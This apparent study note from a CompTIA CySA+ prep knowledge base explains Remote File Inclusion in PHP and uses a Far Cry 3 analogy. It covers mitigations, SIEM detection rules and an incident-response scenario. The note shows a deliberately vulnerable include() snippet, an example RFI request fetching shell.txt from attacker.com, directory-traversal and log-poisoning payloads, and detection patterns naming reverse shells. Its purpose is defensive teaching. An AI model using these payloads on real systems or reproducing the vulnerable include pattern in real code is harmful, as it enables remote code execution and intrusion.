# RFI — Remote File Inclusion

## What it is

In **Far Cry 3**, the outposts on Rook Island let you sneak in and *call in your own enemies*. Tag a Komodo dragon or a tiger with a rock throw from the bushes, send it sprinting through the front gate, and the pirates die to a problem they invited inside their own walls. You didn't breach the perimeter. They opened the door and the threat walked in chewing on guards.

That's exactly what **Remote File Inclusion** does — a vulnerable web app fetches a file from a URL the attacker controls, then executes it as if it were a trusted local component.

Technical definition: RFI is a code injection vulnerability where a web application dynamically includes a file at runtime — typically via a PHP `include()`, `require()`, `include_once()`, or `require_once()` call — and the file path is built from user-controlled input without validation. When the app permits remote URLs (the PHP setting `allow_url_include=On`), the attacker supplies a URL pointing at an attacker-controlled server hosting a malicious script. The vulnerable app fetches that file across the network and executes it inside its own process, with the web server's privileges. Result: **remote code execution**, almost always. RFI is the loud cousin of [[LFI]] (Local File Inclusion), which can only include files already on the victim's disk.

## Why it matters

RFI sits at the top of the impact ladder. A successful RFI is RCE on the web server with the web server's identity — `www-data`, `apache`, `IIS APPPOOL\...` — and from there it's a short walk to [[privilege escalation]], [[lateral movement]], and a webshell that persists past the next deploy.

CompTIA tests RFI under **CS0-003 Objective 2.4** — recommending controls to mitigate software vulnerabilities. Expect the exam to pair RFI with LFI on a single question and force you to pick the right mitigation for the right variant. They also love to ask which configuration setting prevents it, which input validation pattern blocks it, and how RFI differs from [[directory traversal]] and [[SSRF]].

Real-world stakes: RFI is rarer in modern stacks than it was in 2010 because PHP shipped `allow_url_include=Off` as default in 5.2, but it's still alive in legacy LAMP apps, custom CMS plugins, and anywhere a developer rolled their own templating engine. When you find one in production, it's almost always on an end-of-life component nobody wants to touch.

## Key facts

### The mechanic, step by step

A vulnerable PHP snippet looks like this:

```php
<?php
  $page = $_GET['page'];
  include($page . ".php");
?>
```

Normal request:
```
https://victim.com/index.php?page=about
```
Server includes `about.php`. Fine.

RFI exploit:
```
https://victim.com/index.php?page=http://attacker.com/shell.txt?
```
Server fetches `http://attacker.com/shell.txt`, executes it as PHP. The trailing `?` turns the appended `.php` into a query string. Attacker's `shell.txt` contains PHP that spawns a reverse shell, writes a webshell to disk, or just runs `system($_GET['cmd'])` and waits.

### LFI vs RFI — the trap CompTIA loves

| Attribute | LFI | RFI |
|---|---|---|
| File source | Local filesystem | Remote URL |
| Required config | `allow_url_include` can be Off | `allow_url_include=On` |
| Typical payload | `../../../../etc/passwd` | `http://attacker.com/shell.txt` |
| Best outcome for attacker | Read sensitive files, log poisoning → RCE | Direct RCE |
| Defense in PHP config | `open_basedir` restriction | `allow_url_include=Off`, `allow_url_fopen=Off` |
| Family | [[Directory traversal]] cousin | Code injection cousin |

LFI can become RCE if the attacker can write attacker-controlled content to a file the server will then include — log poisoning (write PHP into the User-Agent header, include `/var/log/apache2/access.log`), session file inclusion, or uploaded image with PHP in EXIF. CompTIA usually keeps it cleaner than that, but know the path exists.

### Why it's specifically a PHP problem

RFI is overwhelmingly a PHP vulnerability because PHP's `include`/`require` family is the only mainstream language feature that will fetch a URL and execute it as code in one call. Java, .NET, Python, Node — none of them have a native equivalent that ships enabled by default. You can build the same vulnerability in any language by manually fetching a URL and `eval()`-ing the response, but it requires a developer doing something obviously wrong, not just using a built-in.

The runtime flags that matter:

- `allow_url_fopen` — lets PHP file functions open URLs at all. Default On.
- `allow_url_include` — lets `include`/`require` open URLs. Default **Off** since PHP 5.2.

Both have to be On for the classic RFI to work. If only `allow_url_fopen` is on, you get [[SSRF]] but not RFI.

### Mitigations — what to actually recommend

In priority order for the exam and for production:

1. **Don't pass user input to include functions.** Use an allowlist of known-good page names mapped to known file paths. `$pages = ['about' => 'about.php', 'contact' => 'contact.php']; include($pages[$_GET['page']]);`
2. **Set `allow_url_include=Off`** in `php.ini`. This is the single config flip that kills classic RFI dead.
3. **Set `allow_url_fopen=Off`** if the app doesn't legitimately need to fetch remote URLs. Kills SSRF too.
4. **Input validation** — reject any input containing `://`, `..`, null bytes (`%00`), or absolute paths. Allowlist beats denylist every time.
5. **`open_basedir`** — restricts PHP file access to a specific directory tree. Doesn't stop RFI by itself but contains LFI and limits blast radius.
6. **Web Application Firewall** — signatures for `http://`, `https://`, `ftp://`, `php://`, `data://`, `expect://` in query parameters. Compensating control, not a fix.
7. **Run the web server as a low-privilege account** — limits what the RCE can do once it lands.
8. **Disable dangerous PHP wrappers** — `php://filter`, `data://`, `expect://` enable creative variants even with `allow_url_include=Off`.
9. **Patch and replace EOL components.** If the app is on PHP 5.x in 2026, RFI is the third-worst problem you have.

### Detection — what fires in the SIEM

RFI generates loud, distinctive log signatures:

- HTTP access log entries with `http://`, `https://`, `ftp://`, or `php://` in query string parameters
- 200 responses to URLs containing external hostnames in parameters
- Outbound connections from the web server to unusual destinations immediately after suspicious GET requests
- Web server process spawning shells (`sh`, `bash`, `cmd.exe`, `powershell.exe`) — your EDR should scream
- New files appearing in web root that weren't part of a deploy

Solid SIEM rule: web server access log + URI parameter matches `(https?|ftp|php|data|expect)://` + response code 2xx → alert.

### Where RFI fits in the [[OWASP Top 10]]

OWASP 2021 folded RFI/LFI into **A03: Injection** and **A05: Security Misconfiguration**. The injection lens covers the user-input-becomes-code path. The misconfiguration lens covers `allow_url_include=On` shipping in production. Both apply.

### CompTIA exam traps

> **CompTIA exam trap:** RFI and [[SSRF]] both involve the server fetching attacker-supplied URLs, and the exam will try to blur them. SSRF makes the server *fetch* the URL and return or act on the response — the attack is about *where the request goes* (internal services, cloud metadata endpoints). RFI makes the server fetch *and execute* the URL as code. SSRF = abused HTTP client. RFI = abused code loader. If the question mentions cloud metadata (169.254.169.254), it's SSRF. If it mentions `include()` or RCE, it's RFI.

> **CompTIA exam trap:** RFI and [[directory traversal]] look similar in the URL but aren't the same. Directory traversal (`../../../etc/passwd`) reads or writes files outside the intended directory but doesn't execute them. LFI executes a local file through `include()`. RFI executes a remote file. Traversal → file disclosure. LFI → execution of files already on disk. RFI → execution of attacker-hosted code.

> **CompTIA exam trap:** The "best mitigation" question. If the answer choices include both "input validation" and "set `allow_url_include=Off`," the more specific configuration control is usually the better answer for RFI specifically, but the *most defensible* answer is "don't pass user input to include functions at all" (insecure design fix). Read the stem carefully — they're asking for the best control, not the easiest.

## SOC reality

- **3am alert:** WAF fires "external URL in parameter" rule against a legacy `/cms/index.php?template=...` endpoint. L1 looks at the access log, sees `?template=http://185.x.x.x/sh.txt?`, sees a 200 response, sees the web server's user start a `bash -i` child process two seconds later. That's not a tuning question. That's IR on the phone.

- **First action:** Isolate the host from the network — pull it from the load balancer, keep it powered on for memory acquisition. Do not reboot. The webshell is probably on disk already; the in-memory reverse shell is the evidence you'll lose first.

- **What the IR lead asks:** "Scope — how many hosts run this app? Impact — what's the web server account allowed to touch? Evidence — do we have full packet capture, or just NetFlow? Did the attacker pivot? Is there a webshell? When was the first request from that source IP in the last 90 days of logs?"

- **What you never promise leadership:** "We've contained it." Not until you've confirmed no webshells on disk, no scheduled tasks, no cron entries, no new SSH keys, no modified `.htaccess`, and the source IP isn't already inside the network through another door. A webshell is a persistence mechanism — the original RFI is the *delivery*, not the *infection*.

- **Handoff:** L1 confirms exploitation → L2 acquires memory and disk image, preserves chain of custody → IR lead scopes to other hosts running the same app → AppSec gets a P1 ticket to either patch the include logic or pull `allow_url_include` off in `php.ini` → vuln management chases the EOL component that should have been retired in 2019.

*The RFI is rarely the surprise. The surprise is finding out the same legacy app is deployed on twelve more hosts and nobody documented it.*

## Related concepts

[[LFI]] · [[Directory traversal]] · [[SSRF]] · [[RCE]] · [[Injection flaws]] · [[XSS]] · [[OWASP Top 10]] · [[Security misconfiguration]] · [[End-of-life components]] · [[WAF]] · [[Input validation]] · [[Webshell]] · [[Privilege escalation]] · [[Insecure design]]

*Source: VIRGIL knowledge base — 2026-05-11*